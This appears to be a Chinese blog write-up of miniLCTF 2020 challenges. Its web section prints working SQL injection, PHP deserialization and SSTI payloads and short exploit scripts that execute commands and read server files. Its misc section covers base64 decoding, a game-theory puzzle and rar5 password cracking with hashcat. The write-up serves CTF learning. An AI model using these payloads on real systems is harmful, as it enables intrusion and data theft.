item.description:
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYueGlkaWFuLmVkdS5jbi9jaGFsbGVuZ2Vz&#34;&gt;平台&lt;/span&gt;上只有web的题目，只写了web。比赛的时候应该还有其他的。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIwL3RyZWUvbWFpbi9NaXNj&#34;&gt;西电的信息安全协会里有题目&lt;/span&gt;，&lt;del&gt;什么时候复现一下&lt;/del&gt;&lt;/p&gt;
&lt;h1 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h3 id=&#34;id-wife&#34;&gt;&lt;a href=&#34;#id-wife&#34; class=&#34;headerlink&#34; title=&#34;id_wife&#34;&gt;&lt;/a&gt;id_wife&lt;/h3&gt;&lt;p&gt;好像根据BUUCTF的那个随便注改的吧？之前我也写过那个题的wp. 但最开始没想到堆叠注入，试了挺多方法写脚本跑一下库名表名，最后得到了库名miniL，没跑出来表名,这个就是用二分法不断的尝试&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=1&amp;#39;) or (ascii(substr(database(),1,1)))&amp;lt;150#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;后来想起来应该是堆叠注入，得到了俩表user和1145141919810，查看下内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=1&amp;#39;) or (ascii(substr(database(),1,1)))&amp;lt;150;show columns from `user`;
id=1&amp;#39;) or (ascii(substr(database(),1,1)))&amp;lt;150;show columns from `1145141919810`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后查看列在1145141919810中看到了content（flag也应该在这里） 在mysql中支持预编译可以绕过很多种限制，本题中由于可以使用堆叠查询，并且需要使用SELECT关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。&lt;br&gt;在sql中我们运用如下语句预编译：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set @sql=CONCAT(&amp;#39;sele&amp;#39;,&amp;#39;ct content from `1145141919810`&amp;#39;);
prepare payload from @sql;
execute payload;
deallocate prepare payload;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;做到最后一个hint：strstr（）是提示我们大小写的，多试着改几次&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=1&amp;#39;) or (ascii(substr(database(),4,1)))=105;SET @SQL=CONCAT(&amp;#39;sele&amp;#39;,&amp;#39;ct content From `1145141919810`&amp;#39;); PREPARE PAYLOAD FROM @sql;EXECUTE Payload;Deallocate prePare payload;Show Columns From `1145141919810` ;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后就可以拿到flag了（发现怎么还有个假的？？？emmmm）&lt;/p&gt;
&lt;h3 id=&#34;P&#34;&gt;&lt;a href=&#34;#P&#34; class=&#34;headerlink&#34; title=&#34;P&#34;&gt;&lt;/a&gt;P&lt;/h3&gt;&lt;p&gt;发现将cookie两部处理后传入file，将cookie里的gitbase64decode一下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;O:5:&amp;quot;gitee&amp;quot;:1:&amp;#123;s:4:&amp;quot;file&amp;quot;;s:9:&amp;quot;index.php&amp;quot;;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;改成&lt;code&gt;O:5:&amp;quot;gitee&amp;quot;:1:&amp;#123;s:4:&amp;quot;file&amp;quot;;s:11:&amp;quot;classes.php&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后的__wakeup魔术方法可以用php反序列化的CVE-2016-7124绕过。看github，是要传参cmd执行，但是过滤了一大堆东西，发现preg_match里唯独保留了P，此题题目也是P，想到看过的一篇文章，利用执行上传的临时文件tmp/phpXXXXXX，原文地址&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjAxMTM2&#34;&gt;https://www.anquanke.com/post/id/201136&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import base64

url =&amp;#39;&amp;#39;
git = &amp;#39;O:6:&amp;quot;github&amp;quot;:3:&amp;#123;s:4:&amp;quot;file&amp;quot;;s:9:&amp;quot;index.php&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:26:&amp;quot;?&amp;gt;&amp;lt;?=`. /??p/p?p??????`;?&amp;gt;&amp;quot;;&amp;#125;&amp;#39;#反引号不输出，用&amp;lt;?=代替&amp;lt;?php echo输出
git = base64.b64encode(git.encode()).decode()
cookies = &amp;#123;&amp;#39;git&amp;#39;: git&amp;#125;
files = &amp;#123;&amp;#39;file&amp;#39;: &amp;#39;#!/bin/sh\ncat /* | grep minil&amp;#39;&amp;#125;
a = requests.post(url, files=files, cookies=cookies)
print(a.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;签-到-题&#34;&gt;&lt;a href=&#34;#签-到-题&#34; class=&#34;headerlink&#34; title=&#34;签 到 题&#34;&gt;&lt;/a&gt;签 到 题&lt;/h3&gt;&lt;p&gt;ls /看到了flag 和readflag，然后看了可用的bash，有sh和ash，不知道ash有什么用，&lt;/p&gt;
&lt;p&gt;/readflag返回&lt;code&gt;do you want the flag?&lt;/code&gt; ，后来🐧说frk喜欢考察linux，或许是交互回复一个yes?找了一下可以交互的函数，找到了&lt;strong&gt;proc_open&lt;/strong&gt;，查了下函数的用法，一开始用Yes没用，试了下y有回显，到最后出来一个式子，不知道可不可以用正则，刷新了一下发现有重复的算式，就跑个循环吧，构造如下exp，核心是&lt;code&gt;y\ny\n120\n&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time
url = &amp;#39;&amp;#39;
url += &amp;#39;?a=php%20-r%20%27$descriptors%20=%20array(0%20=%3E%20array(%22pipe%22,%20%22r%22),1%20=%3E%20array(%22pipe%22,%20%22w%22));$process%20=%20proc_open(%22/readflag%22,%20$descriptors,%20$pipes);echo%20fgets($pipes[1]);fwrite($pipes[0],%22y\ny\n120\n%22);fclose($pipes[0]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);%27&amp;#39;

while 1:
    r = requests.get(url)
    print(r.text)
    if &amp;#39;minil&amp;#39; in r.text:
        break
    time.sleep(1)#不用延时的话一直都是docker准备状态 ):
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;// Frank注: 你们为什么都这么喜欢暴力啊啊啊啊啊 怪我心软了给你们模了100&lt;/p&gt;
&lt;h3 id=&#34;are-you-reclu3e-Author-blackwatch&#34;&gt;&lt;a href=&#34;#are-you-reclu3e-Author-blackwatch&#34; class=&#34;headerlink&#34; title=&#34;are you reclu3e?| Author: blackwatch&#34;&gt;&lt;/a&gt;are you reclu3e?| Author: blackwatch&lt;/h3&gt;&lt;p&gt;扫出来了 .index.php.swp .login.php.swp&lt;/p&gt;
&lt;p&gt;vim -r 还原&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;login.php
&amp;lt;?php
    include &amp;quot;connection.php&amp;quot;;
    mysqli_query($conn, &amp;quot;SET CHARACTER SET &amp;#39;gbk&amp;#39;&amp;quot;);

    $username=addslashes($_POST[&amp;#39;username&amp;#39;]);
    $password=addslashes($_POST[&amp;#39;password&amp;#39;]);
    $msg=&amp;#39;&amp;#39;;
    if(empty($username))&amp;#123;
        $msg=&amp;#39;please post your username&amp;#39;;
    &amp;#125;
    else&amp;#123;
        $sql=&amp;quot;select * from users where username=&amp;#39;$username&amp;#39;&amp;quot;;
        $result=mysqli_query($conn,$sql);
        if($result)&amp;#123;
            $row=mysqli_fetch_array($result,MYSQLI_ASSOC);
        &amp;#125;
        if(empty($row))&amp;#123;
            $msg=&amp;#39;you are not reclu3e&amp;#39;;
        &amp;#125;
        else&amp;#123;
            if($row[&amp;#39;password&amp;#39;]!==$password)&amp;#123;
                $msg=&amp;#39;I know you are reclu3e but you need post the right password&amp;#39;;
            &amp;#125;
            else&amp;#123;
                session_start();
                $_SESSION[&amp;#39;uid&amp;#39;] = $username;
                echo &amp;#39;&amp;lt;script&amp;gt;alert(&amp;quot;Yes! you are reclu3e&amp;quot;)&amp;lt;/script&amp;gt;&amp;#39;;
            &amp;#125;
        &amp;#125;
    &amp;#125;
    if(!empty($msg))&amp;#123;
        echo &amp;quot;&amp;lt;script&amp;gt;alert(&amp;#39;$msg&amp;#39;)&amp;lt;/script&amp;gt;&amp;quot;;
    &amp;#125;
    $conn-&amp;gt;close();
    echo &amp;quot;&amp;lt;script type=&amp;#39;text/javascript&amp;#39;&amp;gt;&amp;quot;;  
    echo &amp;quot;window.location.href=&amp;#39;index.php&amp;#39;&amp;quot;;  
    echo &amp;quot;&amp;lt;/script&amp;gt;&amp;quot;;  
index.php
&amp;lt;?php
    include &amp;quot;flag.php&amp;quot;;//$flag=&amp;quot;minilctf&amp;#123;****&amp;#125;&amp;quot;;
    session_start();
    if (empty($_SESSION[&amp;#39;uid&amp;#39;])) &amp;#123;
        include &amp;quot;loginForm.html&amp;quot;;
    &amp;#125;
    else&amp;#123;
        echo &amp;#39;&amp;lt;h1&amp;gt;Hello, reclu3e!&amp;lt;/h1&amp;gt;&amp;#39;;
        $p=unserialize(isset($_GET[&amp;quot;p&amp;quot;])?$_GET[&amp;quot;p&amp;quot;]:&amp;quot;&amp;quot;);
    &amp;#125;
?&amp;gt;
&amp;lt;?php
class person&amp;#123;
    public $name=&amp;#39;&amp;#39;;
    public $age=0;
    public $weight=0;
    public $height=0;
    private $serialize=&amp;#39;&amp;#39;;
    public function __wakeup()&amp;#123;
        if(is_numeric($this-&amp;gt;serialize))&amp;#123;
            $this-&amp;gt;serialize++;
        &amp;#125;
    &amp;#125;
    public function __destruct()&amp;#123;
        @eval(&amp;#39;$s=&amp;quot;&amp;#39;.$this-&amp;gt;serialize.&amp;#39;&amp;quot;;&amp;#39;);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;login逻辑是判断输入的密码和取出的usr对应的密码比较，插表，GBK+addslashes 宽字节注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=reclu3e%df%27%20union%20select%201,2%23&amp;amp;password=2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;php反序列化漏洞，private变量名前后要用%00&lt;/p&gt;
&lt;p&gt;&lt;code&gt;@eval(&amp;#39;$s=&amp;quot;&amp;#39;.$this-&amp;gt;serialize.&amp;#39;&amp;quot;;&amp;#39;);&lt;/code&gt;用”;闭合前后&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/index.php?p= O:6:&amp;quot;person&amp;quot;:5:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:0:&amp;quot;&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:0;s:6:&amp;quot;weight&amp;quot;;i:0;s:6:&amp;quot;height&amp;quot;;i:0;s:17:&amp;quot;%00person%00serialize&amp;quot;;s:30:&amp;quot;&amp;quot;;high
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;IP-echo-service&#34;&gt;&lt;a href=&#34;#IP-echo-service&#34; class=&#34;headerlink&#34; title=&#34;IP echo service&#34;&gt;&lt;/a&gt;IP echo service&lt;/h2&gt;&lt;p&gt;本题考点为&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY3OSN0b2MtMQ==&#34;&gt;ssti注入&lt;/span&gt;，而且过滤了双下划线&lt;code&gt;__&lt;/code&gt;，百度过滤后的注入方法，先构造get请求&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?c=__class__&amp;amp;b=__bases__&amp;amp;s=__subclasses__&amp;amp;i=__init__&amp;amp;g=__globals__&amp;amp;bt=__builtins__&amp;amp;d=__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag&amp;#39;).read()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再伪造ip利用ssti漏洞进行注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-Forwarded-For: &amp;#123;&amp;#123;[][request.args.c][request.args.b][0][request.args.s]()[76][request.args.i][request.args.g][request.args.bt].eval(request.args.d)&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67&#34;&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67&#34; alt=&#34;image-20200509183253437&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;ezlogin&#34;&gt;&lt;a href=&#34;#ezlogin&#34; class=&#34;headerlink&#34; title=&#34;ezlogin&#34;&gt;&lt;/a&gt;ezlogin&lt;/h2&gt;&lt;p&gt;过滤逗号等号的无列名注入，PHP反序列化字符逃逸&lt;/p&gt;
&lt;p&gt;注入做的非预期：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;logname=1&amp;quot;||1 limit 1 offset 3#&amp;amp;logpass=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;code&gt;alert(&amp;#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&amp;#39;)&lt;/code&gt;，访问。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$key = array(&amp;#39;php&amp;#39;,&amp;#39;flag&amp;#39;,&amp;#39;xdsec&amp;#39;);
$filter = &amp;#39;/&amp;#39;.implode(&amp;#39;|&amp;#39;,$key).&amp;#39;/i&amp;#39;;
return preg_replace($filter,&amp;#39;hack!!!!&amp;#39;,$payload);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;php 关键字被替换为 hack!!!! 之后，从3个字符变成了5个字符，但是反序列化的时候由于 s:3 的存在，这个值仍然会被当作三个字符来处理，造成逃逸。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=phpphpphpphpphpphpphp&amp;quot;;s:3:&amp;quot;V0n&amp;quot;;s:14:&amp;quot;has_girlfriend&amp;quot;;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;minil{7f3ea366-f5ab-463c-b511-af63d6dc7715}&lt;/p&gt;
&lt;p&gt;题目思路来源&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIw&#34;&gt;西电安全协会&lt;/span&gt;&lt;/p&gt;

 &lt;h1 id=&#34;MISC&#34;&gt;&lt;a href=&#34;#MISC&#34; class=&#34;headerlink&#34; title=&#34;MISC&#34;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&#34;好白给的签到题&#34;&gt;&lt;a href=&#34;#好白给的签到题&#34; class=&#34;headerlink&#34; title=&#34;好白给的签到题&#34;&gt;&lt;/a&gt;好白给的签到题&lt;/h2&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;压缩包里的文件有点大。。。50MB。。&lt;/p&gt;
&lt;p&gt;有提示：贝斯小学(base)，50 ，路易.六十四(想到base64)，兔子(斐波那契)，反着跳(python逆过来)，八年。&lt;/p&gt;
&lt;p&gt;经过无数base64和反向base64。&lt;/p&gt;
&lt;p&gt;然后打开story.txt看下是base64写脚本解&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import base64
p=open(&amp;#39;story.txt&amp;#39;)
c=p.read().strip()
s=c
&amp;#39;&amp;#39;&amp;#39;
while 1:
    try:
        s=base64.b64decode(s)
        print(s)
    except:
        try:
            s=base64.b64decode(s[::-1])
            print(s)
        except:
            break
&amp;#39;&amp;#39;&amp;#39;
z=&amp;#39;&amp;#39;
s=base64.b64decode(z[::-1])
&amp;#39;&amp;#39;&amp;#39;
while 1:
    s=base64.b64decode(s)
    print(s)
&amp;#39;&amp;#39;&amp;#39;
z=&amp;#39;==QOwQVVY5kbWdVMwY1Rw1mV3tGVWdlVE5kVsxmThZFbWdlUtJlToh1V4lVMUNnWWZVeKZlYYRmRllXSyQmW4dVWDpkRWFGZV5kVaZkV4NWVZRlRUZ1Vkh0YyplVjFTQ6lFcohlYYRWVNZEZxQ1S4d1VaBXVWhFZW1ESSdUYLplVURlWsZ1VKhlTWZ0VhtmQEpleB5mVXB3RhVnWsVFeRZUV&amp;#39;
s=base64.b64decode(z[::-1])
&amp;#39;&amp;#39;&amp;#39;
while 1:
    s=base64.b64decode(s)
    print(s)
&amp;#39;&amp;#39;&amp;#39;
z=&amp;#39;mNVRoN2MSBnTqpFaVxWO1I2aCRHWygTMlBjWVFFM4BnYtxmT&amp;#39;
s=base64.b64decode(z[::-1])
while 1:
    s=base64.b64decode(s[::-1])
    print(s[::-1])
##MiniLCTF&amp;#123;5o_m@ny_Ra66its!!&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;txt里面的base64解密后逆过来的&lt;code&gt;&lt;/code&gt;就使flag的加密，慢慢尝试就行了&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&#34;抓猫猫&#34;&gt;&lt;a href=&#34;#抓猫猫&#34; class=&#34;headerlink&#34; title=&#34;抓猫猫&#34;&gt;&lt;/a&gt;抓猫猫&lt;/h2&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;抓堆问题：博弈论的数学问题….&lt;/p&gt;
&lt;p&gt;&lt;code&gt;有一堆谷粒（例如100粒），甲乙轮流抓，每次可抓1-5粒，甲先抓，规定谁抓到最后一把谁赢。甲应该如何抓？为什么？ 先不考虑100粒的问题，假如谷粒只有一粒，甲一次就可以抓完，直接获胜。两粒，三粒，四粒，五粒也是同样的情况。但是如果谷粒有六粒的话，甲一次性无法抓完，乙必然会赢。 那怎么样甲才能稳赢呢，就是在最后只剩六个谷粒的时候让乙先抓取，在最开始取时甲就要将剩下的谷粒数限定在六的倍数内，只要甲取完每次都是六的倍数，甲就必胜了。&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;k倍博弈&#34;&gt;&lt;a href=&#34;#k倍博弈&#34; class=&#34;headerlink&#34; title=&#34;k倍博弈&#34;&gt;&lt;/a&gt;k倍博弈&lt;/h3&gt;&lt;p&gt;两个人取一堆n的石子，先手不能全部取完，之后每人取的个数不能超过另一个人上轮取的K倍。&lt;/p&gt;
&lt;p&gt;当k=1时，必败态都是2^i,我们可以借助二进制的思想来理解，将n表示为2进制，先手拿掉最后一个1，后手肯定没法去掉更高位的1，所以后手取完，先手至少还能拿掉最后一个1，所以先手必胜。当n=2^i时，先手必败，因为此时n的二进制只有一个1，先手第一次不能取完，所以先手取了以后，后手一定能取到最后一个1，然后先手不能去掉更高位的1，所以先手必败。&lt;/p&gt;
&lt;p&gt;假设&lt;code&gt;n=6(110)&lt;/code&gt;，我们先去掉最后一个1，变为4（100），此时如果对手取两个，那么我们直接去两个就能取完，如果对手取一个，还剩3个，我们能取到最后一个。&lt;/p&gt;
&lt;p&gt;当k=2时，这就是一个Fibonacci博弈，可知先手必胜当且仅当n不为Fibonacci数，还是利用，先手取掉最后一个1，后手无法去掉更高位的1，所以后手取完，先手至少还能拿掉最后一个1。Fibonacci数列有一个很好的性质就是，任何一个整数都可以表示为若干项不连续的Fibonacci数，所以我们先去掉最后一个1，即一个数x，后手肯定无法去掉更高的数2x，小于高两位的1，所以后手无法取完。&lt;/p&gt;
&lt;p&gt;假设&lt;code&gt;n=11=7+3+1&lt;/code&gt;，表示为10101，我们先手去掉最后一个1，后手无法去掉高两位的1，所以后手取完，我们至少还能去掉最后一个1。&lt;/p&gt;
&lt;p&gt;当k的时候，想办法构造数列，使得数列的任意两项之间的倍数大于k。&lt;/p&gt;
&lt;p&gt;就像Fibonacci博弈一样，我们还是想要构造一个想Fibonacci一样的数列，我们用a数组，表示要构造的数列，&lt;code&gt;b[i]&lt;/code&gt;表示&lt;code&gt;a[1..i]&lt;/code&gt;所能组成的最大数，为了方便理解，我们还是用Fibonacci数列举例子，显然&lt;code&gt;a[ ]=&amp;#123;1,2,3,5,8...&amp;#125;&lt;/code&gt;,&lt;code&gt;b[3]=4&lt;/code&gt;,因为5本身就是Fibonacci数，而&lt;code&gt;6=1+2+3&lt;/code&gt;，相邻两项的倍数根本就不大于&lt;code&gt;2&lt;/code&gt;，&lt;code&gt;6=1+5&lt;/code&gt;，&lt;code&gt;b[4]=6&lt;/code&gt;。所以b数组中的数时我们要构造的数列中的一些满足要求的数的和，&lt;code&gt;a[i]=b[i-1]+1&lt;/code&gt;,为什么呢，因为&lt;code&gt;a[i]&lt;/code&gt;中的数是不可构造的，因为取到它就是必败。而&lt;code&gt;b[i-1]&lt;/code&gt;是&lt;code&gt;a[1..i-1]&lt;/code&gt;所能构造的最大数，那么加1，就是无法被前面的数列构造出来，所以只能另外开一项。&lt;/p&gt;
&lt;p&gt;关于&lt;code&gt;b[i]&lt;/code&gt;的构造，由于&lt;code&gt;b[i]&lt;/code&gt;是&lt;code&gt;a[1..i]&lt;/code&gt;中的数构造出来的，所以我们一定会用到&lt;code&gt;a[i]&lt;/code&gt;,不然就成了&lt;code&gt;b[i-1]&lt;/code&gt;了，所以我们先要按递减顺序找到&lt;code&gt;a[t]*k&amp;lt;a[i]&lt;/code&gt;,那么&lt;code&gt;b[i]=b[t]+a[i]&lt;/code&gt;,如果前面找不到那么&lt;code&gt;b[i]=a[i]&lt;/code&gt;,为什么呢，因为前面的数没有k项或者说构造出来太小了，所以只能选取一个，那么肯定选取最大的哪一个，前面&lt;code&gt;a[1...i-1]&lt;/code&gt;所构造的项&lt;code&gt;b[i-1]&lt;/code&gt;小于&lt;code&gt;a[i]&lt;/code&gt;,所以这种情况下&lt;code&gt;b[i]=a[i]&lt;/code&gt;。所以我们先手能不能必胜就看n在不在这个&lt;code&gt;a[ ]&lt;/code&gt;数组里面，给出模板&lt;/p&gt;
&lt;p&gt;所以这里我们由于抓猫的数量不能超过前一次抓猫的数量，所以在猫猫数量为偶数时不能抓奇数只猫猫，否则对方只抓一只猫猫我们就输了。 所以我们需要找出一个偶数，使得我们抓完后剩余的猫猫数为该偶数的倍数即可抓住猫猫&lt;/p&gt;
&lt;p&gt;假若说他先抓了32只猫猫，剩下了108只猫猫，我发现我抓12只的话还剩96只，96是12的倍数。这个时候他抓12，我也抓12，他抓8我就抓4，他抓10我就抓2，他抓6，我就6，他抓4我就4，他抓2我就2，就稳赢。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;#include&amp;lt;cstdio&amp;gt;
using namespace std;
const int maxn=1000000+7;
int a[maxn];   //构造的数列
int b[maxn];    //b[i]为a[1..i]所能凑出的最大数
int main()
&amp;#123;
  int n,k;
  while(scanf(&amp;quot;%d %d&amp;quot;,&amp;amp;n,&amp;amp;k)==2)&amp;#123;
    int i=0,j=0;
    a[0]=b[0]=1;
    while(a[i]&amp;lt;n)&amp;#123;
      i++;
      a[i]=b[i-1]+1;    //a[i]为a[1..i-1]所能构造出的最大的那个数+1
      while(a[j+1]*k&amp;lt;a[i]) j++;  //寻找临界点
      if(a[j]*k&amp;lt;a[i])  b[i]=b[j]+a[i];   //a[1..j]所能构造出来的最大值加上a[i]
      else b[i]=a[i];   //相邻  小于了K倍 自然构造的最大的数就是a[i]了
    &amp;#125;
    if(a[i]==n)  printf(&amp;quot;Lost\n&amp;quot;);   //如果数列a中有n则先手必败
    else printf(&amp;quot;Win\n&amp;quot;);
  &amp;#125;
  return 0;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面都是理论，看看就行。&lt;/p&gt;
&lt;h3 id=&#34;再看出题人的意思&#34;&gt;&lt;a href=&#34;#再看出题人的意思&#34; class=&#34;headerlink&#34; title=&#34;再看出题人的意思**&#34;&gt;&lt;/a&gt;再看出题人的意思**&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;文本&#34;&gt;题意：

两个人轮流抓猫。初始有 n 只猫，第一次最少抓 1 只，最多抓 n - 1 只。之后的每轮至少抓 1 只，至多不能超过上一次抓的数量。抓走最后一只猫的人胜利。电脑先抓且保证第一次抓不是最优解。

先上结论：n 是 2 的幂时后手必胜，否则先手必胜

证明：

考虑这个数的最低二进制位，即 lowbit ，例如 6 的 lowbit 是 2 ，12 的 lowbit 是 4

现在拿走 n 的 lowbit ，记为 b，讨论对方的做法，记拿的数为 a

① a = b

易证剩下的数 n - 2b 的 lowbit 还是 b ，下一步可以再拿 b

② a &amp;lt; b

由于 b 是 2 的幂，所以小于 b 且大于 1 的数必由小于 b 的二进制位组成

易证剩下的数 n - a - b 的 lowbit 一定小于 b，所以下一步必定可以拿走更小的 lowbit

因此每次必可以拿走当前数的 lowbit ，直至当前数为 1 为止，此时数的 lowbit 为自身，拿走即胜利

需要注意的是，对方任何时候都不可能拿走剩下的所有数，因为 n - lowbit(n) &amp;gt; lowbit(n)

而当初始数为 2 的幂的时候，没有 lowbit 可拿（最多拿 n - 1 ），此时拿任何数都会导致对方出现可拿的 lowbit ，因此必败
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;什么是二进制最低位？&#34;&gt;&lt;a href=&#34;#什么是二进制最低位？&#34; class=&#34;headerlink&#34; title=&#34;什么是二进制最低位？&#34;&gt;&lt;/a&gt;&lt;strong&gt;什么是二进制最低位&lt;/strong&gt;？&lt;/h3&gt;&lt;p&gt;首先要理解&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F1bnF1bnN0eWxlOTkvYXJ0aWNsZS9kZXRhaWxzLzgyNzE2OTkw&#34;&gt;二进制最低位&lt;/span&gt;这个概念`给出一个整数A，输出它的最低位数&lt;br&gt;比如：A= 26，它的二进制形式为：11010，最低位为10，所以应该输出2&lt;br&gt;再比如 A=92，它的二进制为：01011100，最低位为：100，所以应输出4。其实就是转为二进制从右到左首先出现1的数。&lt;/p&gt;
&lt;h3 id=&#34;尝试&#34;&gt;&lt;a href=&#34;#尝试&#34; class=&#34;headerlink&#34; title=&#34;尝试&#34;&gt;&lt;/a&gt;&lt;strong&gt;尝试&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;首先输入的不能为奇数，不然二进制最低位都是1，电脑抓的猫猫就都为1，一直偶数抓下去就必输。其次我们输入的偶数要让电脑抓的是奇数，然后我们输入1，这样才能使剩余的为奇数，我们一直抓一直猫猫就必赢了。&lt;/p&gt;
&lt;p&gt;怎么才能使电脑抓的使奇数呢？&lt;/p&gt;
&lt;p&gt;就牵扯到二进制最低位了，举个列子，不用完全搞懂，实验是真理的唯一标准！&lt;/p&gt;
&lt;h3 id=&#34;实验&#34;&gt;&lt;a href=&#34;#实验&#34; class=&#34;headerlink&#34; title=&#34;实验&#34;&gt;&lt;/a&gt;&lt;strong&gt;实验&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;我的XDU一共是是150个猫猫，CDCQ抓到34个猫猫，还剩116个。&lt;/p&gt;
&lt;p&gt;116的二进制是111 0100，所以他的最低位是100，就是2的2次方为4。&lt;/p&gt;
&lt;p&gt;所以我们输入二进制最低位4，直接爆出奇数。&lt;/p&gt;
&lt;p&gt;其实用上面的公式也可以n-1为奇数，太抽象了。。。原理我这个数学渣渣也不知道&lt;/p&gt;
&lt;p&gt;n 是 2 的幂时，计算二进制位，就可以拿到flag了。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&#34;好康的硬盘&#34;&gt;&lt;a href=&#34;#好康的硬盘&#34; class=&#34;headerlink&#34; title=&#34;好康的硬盘&#34;&gt;&lt;/a&gt;好康的硬盘&lt;/h2&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;文件zip打开flag.txt一看什么都没有就是零宽隐写也可以到kali的vim里面去验证&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzMzMGsuZ2l0aHViLmlvL21pc2NfdG9vbHMvdW5pY29kZV9zdGVnYW5vZ3JhcGh5Lmh0bWw=&#34;&gt;解密网站&lt;/span&gt;很多解密出来&lt;code&gt;minil****&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;rar5用工具好像爆破不出来，用kali里面的rar2john+hashcat。正巧上次用来爆破word文档密码。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rar2john luoqian.rar&lt;/code&gt;生成rar的hash值保存在test.hash里面。注意是这个格式&lt;code&gt;$rar5$16$529d132521c41a0d068fa8ceeab29cde$15$8c79ff2fb201f8b6c1a0981bb57e20c9$8$4138cf0615f62942&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后用&lt;code&gt;hashcat -m 13000 -a 3 test.hash minil?a?a?a?a &lt;/code&gt; 慢慢跑。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222222.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;密码:&lt;code&gt;minil4396&lt;/code&gt; &lt;/p&gt;
